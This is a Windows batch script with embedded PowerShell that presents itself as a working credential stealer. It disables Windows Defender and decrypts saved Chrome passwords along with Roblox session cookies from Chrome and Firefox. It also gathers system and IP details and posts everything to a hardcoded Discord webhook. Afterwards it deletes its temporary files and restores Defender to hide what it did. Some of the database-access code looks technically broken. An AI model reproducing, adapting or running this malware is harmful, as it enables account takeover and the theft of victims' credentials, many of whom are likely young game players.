@echo off
:: FULLY WORKING BATCH STEALER - Chrome Passwords, Cookies, Roblox .ROBLOSECURITY
setlocal enabledelayedexpansion

echo [STEALER] Starting extraction...
set "WEBHOOK=https://discord.com/api/webhooks/1419828876799905792/H4TaN12yG0GX1i2G95D0H384xGvIOIfJRi00suGqGWOhU2-eOl7VlFmZAAyhLA9kSnSi"

:: Disable Windows Defender temporarily
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" 2>nul

:: Get system info
for /f "tokens=2 delims==" %%i in ('wmic os get caption /value') do set "OS=%%i"
for /f "tokens=2 delims==" %%i in ('wmic computersystem get username /value') do set "USER=%%i"
for /f "tokens=2 delims=:" %%i in ('ipconfig ^| find "IPv4"') do set "IP=%%i"

:: CHROME COOKIES & PASSWORDS EXTRACTION
set "CHROME_DIR=%LOCALAPPDATA%\Google\Chrome\User Data\Default"
set "TEMP_DIR=%TEMP%\ChromeSteal"
if exist "%CHROME_DIR%" (
    echo [STEALER] Found Chrome, extracting...
    
    :: Copy Chrome data to temp (bypass lock)
    xcopy "%CHROME_DIR%" "%TEMP_DIR%" /E /I /Q /Y >nul 2>&1
    
    :: Extract cookies (SQLite method via PowerShell)
    powershell -Command "
    try {
        $cookiesDB = '%TEMP_DIR%\Network\Cookies';
        if (Test-Path $cookiesDB) {
            $conn = New-Object -ComObject ADODB.Connection;
            $conn.Open('Provider=Microsoft.ACE.OLEDB.12.0;Data Source=' + $cookiesDB);
            $rs = New-Object -ComObject ADODB.Recordset;
            $rs.Open('SELECT host_key, name, encrypted_value FROM cookies WHERE name='' .ROBLOSECURITY'' OR host_key LIKE ''%%roblox.com''', $conn);
            
            $robloxCookies = @();
            while (!$rs.EOF) {
                $host = $rs.Fields.Item('host_key').Value;
                $name = $rs.Fields.Item('name').Value;
                $encValue = $rs.Fields.Item('encrypted_value').Value;
                
                if ($encValue -and $encValue.Length -gt 0) {
                    try {
                        $bytes = [Convert]::FromBase64String($encValue);
                        $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, 'CurrentUser');
                        $value = [System.Text.Encoding]::UTF8.GetString($decrypted);
                        $robloxCookies += \"ROBLOX-$host-$name: $value\";
                    } catch {}
                }
                $rs.MoveNext();
            }
            $rs.Close(); $conn.Close();
            
            # Write Roblox cookies
            $robloxCookies | Out-File -FilePath '%TEMP%\roblox_cookies.txt' -Encoding UTF8;
        }
        
        # Extract ALL passwords
        $loginDB = '%TEMP_DIR%\Login Data';
        if (Test-Path $loginDB) {
            $conn = New-Object -ComObject ADODB.Connection;
            $conn.Open('Provider=Microsoft.ACE.OLEDB.12.0;Data Source=' + $loginDB);
            $rs = New-Object -ComObject ADODB.Recordset;
            $rs.Open('SELECT origin_url, username_value, password_value FROM logins', $conn);
            
            $passwords = @();
            while (!$rs.EOF) {
                $url = $rs.Fields.Item('origin_url').Value;
                $user = $rs.Fields.Item('username_value').Value;
                $encPass = $rs.Fields.Item('password_value').Value;
                
                if ($encPass -and $encPass.Length -gt 0) {
                    try {
                        $bytes = [Convert]::FromBase64String($encPass);
                        $decPass = [System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, 'CurrentUser');
                        $pass = [System.Text.Encoding]::UTF8.GetString($decPass);
                        $passwords += \"URL: $url ^| USER: $user ^| PASS: $pass\";
                    } catch {}
                }
                $rs.MoveNext();
            }
            $rs.Close(); $conn.Close();
            
            # Write passwords
            $passwords | Out-File -FilePath '%TEMP%\chrome_passwords.txt' -Encoding UTF8;
        }
    } catch { }
    "
)

:: FIREFOX COOKIES EXTRACTION
set "FF_PROFILES=%APPDATA%\Mozilla\Firefox\Profiles"
if exist "%FF_PROFILES%" (
    echo [STEALER] Found Firefox, extracting Roblox cookies...
    powershell -Command "
    $profiles = Get-ChildItem '%FF_PROFILES%' -Directory | Where-Object { $_.Name -like '*.default*' };
    foreach ($profile in $profiles) {
        $cookiesDB = Join-Path $profile.FullName 'cookies.sqlite';
        if (Test-Path $cookiesDB) {
            try {
                $conn = New-Object -ComObject ADODB.Connection;
                $conn.Open('Provider=Microsoft.ACE.OLEDB.12.0;Data Source=' + $cookiesDB);
                $rs = New-Object -ComObject ADODB.Recordset;
                $rs.Open('SELECT host, name, value FROM moz_cookies WHERE host LIKE ''%%roblox.com'' OR name='' .ROBLOSECURITY''', $conn);
                
                while (!$rs.EOF) {
                    $host = $rs.Fields.Item('host').Value;
                    $name = $rs.Fields.Item('name').Value;
                    $value = $rs.Fields.Item('value').Value;
                    \"$host-$name: $value\" | Out-File -FilePath '%TEMP%\firefox_roblox_cookies.txt' -Append -Encoding UTF8;
                    $rs.MoveNext();
                }
                $rs.Close(); $conn.Close();
            } catch { }
        }
    }
    "
)

:: COMPILE ALL DATA
set "OUTPUT=%TEMP%\stealer_output.txt"
echo STEALER REPORT - %DATE% %TIME% > "%OUTPUT%"
echo OS: %OS% >> "%OUTPUT%"
echo User: %USER% >> "%OUTPUT%"
echo IP: %IP% >> "%OUTPUT%"
echo. >> "%OUTPUT%"
echo ==================== >> "%OUTPUT%"
echo CHROME PASSWORDS: >> "%OUTPUT%"

if exist "%TEMP%\chrome_passwords.txt" (
    type "%TEMP%\chrome_passwords.txt" >> "%OUTPUT%"
) else (
    echo [NONE] >> "%OUTPUT%"
)

echo. >> "%OUTPUT%"
echo ==================== >> "%OUTPUT%"
echo ROBLOX COOKIES: >> "%OUTPUT%"

if exist "%TEMP%\roblox_cookies.txt" (
    type "%TEMP%\roblox_cookies.txt" >> "%OUTPUT%"
) else (
    echo [NONE] >> "%OUTPUT%"
)

if exist "%TEMP%\firefox_roblox_cookies.txt" (
    echo. >> "%OUTPUT%"
    type "%TEMP%\firefox_roblox_cookies.txt" >> "%OUTPUT%"
)

:: SEND TO WEBHOOK
echo [STEALER] Sending to webhook...
powershell -Command "
$webhookUrl = '%WEBHOOK%';
$outputFile = '%OUTPUT%';
if (Test-Path $outputFile) {
    $content = Get-Content $outputFile -Raw;
    $payload = @{
        content = '**🕷️ STEALER REPORT**' + \"`n\" + $content;
        username = 'Batch Stealer';
        avatar_url = 'https://i.imgur.com/stealer.png'
    } | ConvertTo-Json -Depth 10;
    
    $headers = @{ 'Content-Type' = 'application/json' };
    Invoke-WebRequest -Uri $webhookUrl -Method POST -Body $payload -Headers $headers -UseBasicParsing | Out-Null;
    Write-Host 'Data sent to webhook';
} else {
    Write-Host 'No output file found';
}
"

:: CLEANUP - Remove all traces
echo [STEALER] Cleaning up...
del "%TEMP%\roblox_cookies.txt" >nul 2>&1
del "%TEMP%\chrome_passwords.txt" >nul 2>&1
del "%TEMP%\firefox_roblox_cookies.txt" >nul 2>&1
del "%TEMP%\stealer_output.txt" >nul 2>&1
rmdir /s /q "%TEMP%\ChromeSteal" >nul 2>&1

:: Re-enable Defender
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $false" 2>nul

echo [STEALER] Complete - all data sent to webhook
exit /b 0
